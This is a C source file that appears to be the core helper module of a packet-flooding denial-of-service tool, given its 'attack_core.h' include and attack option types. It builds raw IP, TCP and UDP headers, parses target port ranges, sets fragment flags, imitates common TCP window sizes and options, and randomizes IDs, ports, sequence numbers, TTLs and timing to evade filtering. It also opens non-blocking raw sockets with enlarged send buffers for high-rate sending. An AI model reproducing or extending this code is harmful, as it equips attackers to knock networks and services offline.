#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <fcntl.h>

#include "headers/attack_core.h"

uint16_t ip_checksum(void* data, size_t len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

uint16_t tcp_udp_checksum(void* data, size_t len, uint32_t src_ip, uint32_t dst_ip, uint8_t protocol) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;

    sum += (src_ip >> 16) & 0xFFFF;
    sum += src_ip & 0xFFFF;
    sum += (dst_ip >> 16) & 0xFFFF;
    sum += dst_ip & 0xFFFF;
    sum += htons(protocol);
    sum += htons(len);

    size_t remaining = len;
    while (remaining > 1) {
        sum += *ptr++;
        remaining -= 2;
    }

    if (remaining == 1) {
        sum += *(uint8_t*)ptr;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

port_range_t parse_port_range(attack_option* opt) {
    port_range_t range = {0, 0};

    if (!opt || !opt->data || opt->len == 0) {
        return range;
    }

    if (opt->len == 2) {
        range.min = range.max = get_option_u16(opt);
        return range;
    }

    char buf[32] = {0};
    size_t copy_len = opt->len < 31 ? opt->len : 31;
    memcpy(buf, opt->data, copy_len);

    char* dash = strchr(buf, '-');
    if (dash) {
        *dash = '\0';
        range.min = (uint16_t)atoi(buf);
        range.max = (uint16_t)atoi(dash + 1);
        if (range.max < range.min) {
            uint16_t tmp = range.min;
            range.min = range.max;
            range.max = tmp;
        }
    } else {
        range.min = range.max = (uint16_t)atoi(buf);
    }

    return range;
}

void build_ip_header(struct iphdr* ip, uint32_t src, uint32_t dst, uint8_t protocol, uint16_t total_len, uint8_t ttl, uint8_t tos) {
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = tos;
    ip->tot_len = htons(total_len);
    ip->id = htons(attack_rand_next() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = ttl ? ttl : 64;
    ip->protocol = protocol;
    ip->saddr = src;
    ip->daddr = dst;
    ip->check = 0;
    ip->check = ip_checksum(ip, sizeof(struct iphdr));
}

void apply_ip_frag(struct iphdr* ip, uint8_t frag_mode) {
    switch (frag_mode) {
        case FRAG_DF:
            ip->frag_off = htons(0x4000); /* Don't Fragment */
            break;
        case FRAG_MF:
            ip->frag_off = htons(0x2000); /* More Fragments — first fragment */
            break;
        default:
            break;
    }
    /* Recalculate checksum after modifying frag_off */
    ip->check = 0;
    ip->check = ip_checksum(ip, sizeof(struct iphdr));
}

static const uint16_t common_windows[] = {8192, 16384, 29200, 43690, 65535, 64240, 32768, 28960};
#define NUM_COMMON_WINDOWS (sizeof(common_windows) / sizeof(common_windows[0]))

void build_tcp_header(struct tcphdr* tcp, uint16_t src_port, uint16_t dst_port, uint32_t seq, uint32_t ack_seq, uint8_t flags) {
    memset(tcp, 0, sizeof(struct tcphdr));
    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack_seq);
    tcp->doff = 5;
    tcp->fin = (flags & 0x01) ? 1 : 0;
    tcp->syn = (flags & 0x02) ? 1 : 0;
    tcp->rst = (flags & 0x04) ? 1 : 0;
    tcp->psh = (flags & 0x08) ? 1 : 0;
    tcp->ack = (flags & 0x10) ? 1 : 0;
    tcp->urg = (flags & 0x20) ? 1 : 0;
    tcp->window = htons(common_windows[attack_rand_next() % NUM_COMMON_WINDOWS]);
}

void build_udp_header(struct udphdr* udp, uint16_t src_port, uint16_t dst_port, uint16_t data_len) {
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + data_len);
    udp->check = 0;
}

int build_tcp_options(uint8_t* opts) {
    int pos = 0;

    opts[pos++] = TCP_OPT_MSS;
    opts[pos++] = 4;
    opts[pos++] = 0x05;
    opts[pos++] = 0xB4;

    opts[pos++] = TCP_OPT_SACK;
    opts[pos++] = 2;

    opts[pos++] = TCP_OPT_NOP;
    opts[pos++] = TCP_OPT_NOP;
    opts[pos++] = TCP_OPT_TS;
    opts[pos++] = 10;
    uint32_t ts = htonl((uint32_t)time(NULL));
    memcpy(opts + pos, &ts, 4);
    pos += 4;
    memset(opts + pos, 0, 4);
    pos += 4;

    opts[pos++] = TCP_OPT_NOP;
    opts[pos++] = TCP_OPT_WSCALE;
    opts[pos++] = 3;
    opts[pos++] = 7;

    return pos;
}

void apply_basic_randomization(struct iphdr* ip, struct tcphdr* tcp) {
    if (ip) {
        ip->id = htons(attack_rand_next() & 0xFFFF);
    }
    if (tcp) {
        tcp->source = htons(attack_rand_next_range(1024, 65535));
        tcp->seq = htonl(attack_rand_next());
    }
}

void apply_medium_randomization(struct iphdr* ip, struct tcphdr* tcp) {
    apply_basic_randomization(ip, tcp);
    if (tcp) {
        tcp->ack_seq = htonl(attack_rand_next());
        tcp->window = htons(attack_rand_next_range(16384, 65535));
    }
}

void apply_full_randomization(struct iphdr* ip, struct tcphdr* tcp, int* delay_us) {
    apply_medium_randomization(ip, tcp);
    if (ip) {
        ip->ttl = attack_rand_next_range(48, 128);
    }
    if (delay_us) {
        *delay_us = attack_rand_next_range(0, 1000);
    }
}

int create_raw_socket(void) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return -1;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return -1;
    }

    int sndbuf = 4 * 1024 * 1024;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf)) < 0) {
        sndbuf = 2 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }

    int tos = 0;
    setsockopt(fd, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    return fd;
}

int create_udp_socket(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return -1;

    int sndbuf = 4 * 1024 * 1024;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf)) < 0) {
        sndbuf = 2 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    return fd;
}
